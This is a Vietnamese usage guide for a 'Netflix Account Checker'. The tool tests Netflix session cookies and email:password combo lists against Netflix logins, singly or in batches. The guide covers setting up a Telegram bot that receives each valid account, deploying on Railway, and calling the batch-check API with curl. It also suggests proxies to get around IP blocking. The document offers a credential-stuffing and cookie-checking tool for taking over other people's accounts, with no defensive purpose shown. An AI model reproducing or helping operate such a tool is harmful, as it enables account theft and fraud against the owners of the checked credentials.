# Hướng Dẫn Sử Dụng Netflix Account Checker

## Mục Lục
1. [Giới thiệu](#giới-thiệu)
2. [Cách tạo Bot Telegram](#cách-tạo-bot-telegram)
3. [Cách lấy Chat ID](#cách-lấy-chat-id)
4. [Deploy lên Railway](#deploy-lên-railway)
5. [Cách sử dụng API](#cách-sử-dụng-api)

---

## Giới thiệu

Netflix Account Checker hỗ trợ 2 loại check:

| Loại | Mô tả |
|------|-------|
| **Cookie** | Check Netflix cookie (NetflixId=...) |
| **Email:Password** | Check acc Netflix bằng email và mật khẩu |

---

## Cách tạo Bot Telegram

### Bước 1: Tạo Bot mới

1. Mở Telegram, tìm kiếm **@BotFather**
2. Gửi command `/newbot`
3. Đặt tên bot (ví dụ: `Netflix Checker Bot`)
4. Đặt username kết thúc bằng `bot` (ví dụ: `netflix_checker_bot`)
5. BotFather sẽ trả về **Bot Token** dạng:
   ```
   1234567890:ABCdefGHIjklMNOpqrsTUVwxyz
   ```
6. **Lưu lại token này!**

### Bước 2: Cấu hình Bot (Tùy chọn)

Gửi tin nhắn cho @BotFather, chọn `/mybots` → chọn bot của bạn → Bot Settings:
- **Menu Button** → Configure Menu Button
- **Bot Pic** → Set Bot Photo
- **Description** → Viết mô tả

---

## Cách lấy Chat ID

### Cách 1: Sử dụng @userinfobot

1. Tìm kiếm **@userinfobot** trên Telegram
2. Gửi tin nhắn bất kỳ cho bot
3. Bot sẽ trả về thông tin including **ID**

### Cách 2: Sử dụng @RawDataBot

1. Tìm kiếm **@RawDataBot**
2. Gửi tin nhắn cho bot
3. Bot trả về JSON chứa `id` chính là Chat ID

### Cách 3: Tạo Group

1. Tạo group mới trên Telegram
2. Thêm bot vào group
3. Gửi tin nhắn bất kỳ
4. Sử dụng API để lấy chat ID:
   ```
   https://api.telegram.org/bot<TOKEN>/getUpdates
   ```
5. Tìm `chat` → `id` trong response

---

## Deploy lên Railway

### Bước 1: Chuẩn bị Code

Đảm bảo cấu trúc thư mục:
```
ckcheker/
├── api/
│   └── main.py
├── checker.py
├── checker_utils.py
├── main.py
├── netflix_login.py
├── proxy_manager.py
├── static/
│   ├── index.html
│   ├── style.css
│   └── script.js
├── requirements.txt
└── railway.toml
```

### Bước 2: Push lên GitHub

```bash
# Khởi tạo git (nếu chưa có)
git init
git add .
git commit -m "Add Netflix Account Checker"

# Tạo repo trên GitHub và push
git remote add origin https://github.com/yourusername/ckcheker.git
git branch -M main
git push -u origin main
```

### Bước 3: Deploy trên Railway

1. Truy cập https://railway.app
2. Đăng nhập bằng GitHub
3. Click **"New Project"**
4. Chọn **"Deploy from GitHub repo"**
5. Chọn repo `ckcheker`
6. Đợi deploy hoàn tất (khoảng 2-3 phút)
7. Click vào domain để mở web (ví dụ: `https://ckcheker.up.railway.app`)

---

## Cách sử dụng API

### 1. Cấu hình Telegram

```bash
curl -X POST "https://your-app.railway.app/api/telegram-config" \
  -H "Content-Type: application/json" \
  -d '{
    "enabled": true,
    "bot_token": "YOUR_BOT_TOKEN",
    "chat_id": "YOUR_CHAT_ID"
  }'
```

**Response:**
```json
{"status": "success", "message": "Cấu hình Telegram đã được lưu"}
```

---

### 2. Check Cookie (1 cái)

```bash
curl -X POST "https://your-app.railway.app/api/check" \
  -H "Content-Type: application/json" \
  -d '{
    "content": "NetflixId=...",
    "mode": "fullinfo"
  }'
```

---

### 3. Check Email:Password (1 cái)

```bash
curl -X POST "https://your-app.railway.app/api/check-email" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@gmail.com",
    "password": "matkhau123"
  }'
```

**Response:**
```json
{
  "status": "success",
  "email": "test@gmail.com",
  "result": "valid",
  "message": "Login successful - valid account"
}
```

---

### 4. Check Email:Password (Nhiều cái)

```bash
curl -X POST "https://your-app.railway.app/api/check-email-batch" \
  -H "Content-Type: application/json" \
  -d '{
    "combos": [
      {"email": "test1@gmail.com", "password": "matkhau1"},
      {"email": "test2@gmail.com", "password": "matkhau2"},
      {"email": "test3@gmail.com", "password": "matkhau3"}
    ]
  }'
```

**Response:**
```json
{
  "status": "success",
  "total": 3,
  "valid": 1,
  "invalid": 1,
  "locked": 0,
  "error": 1,
  "results": [
    {"email": "test1@gmail.com", "result": "valid", "message": "..."},
    {"email": "test2@gmail.com", "result": "invalid", "message": "..."},
    {"email": "test3@gmail.com", "result": "error", "message": "..."}
  ]
}
```

---

### 5. Batch Check Cookie (Nhiều file)

```bash
curl -X POST "https://your-app.railway.app/api/batch-check" \
  -F "files=@cookie1.txt" \
  -F "files=@cookie2.txt" \
  -F "mode=fullinfo"
```

---

## Kết quả trả về

| Status | Ý nghĩa |
|--------|---------|
| `valid` | Tài khoản hoạt động |
| `invalid` | Sai mật khẩu |
| `locked` | Tài khoản bị khóa |
| `challenge` | Cần xác thực thêm |
| `error` | Lỗi khác |

---

## Sử dụng với Frontend

Mở trình duyệt tới domain Railway:
- Giao diện web: `https://your-app.railway.app`
- API Docs: `https://your-app.railway.app/docs`

---

## Lưu ý

1. **Rate Limit**: Netflix có thể chặn nếu check quá nhanh
2. **Proxy**: Có thể cần proxy nếu bị chặn IP
3. **Telegram**: Tin nhắn chỉ được gửi khi tìm thấy account VALID
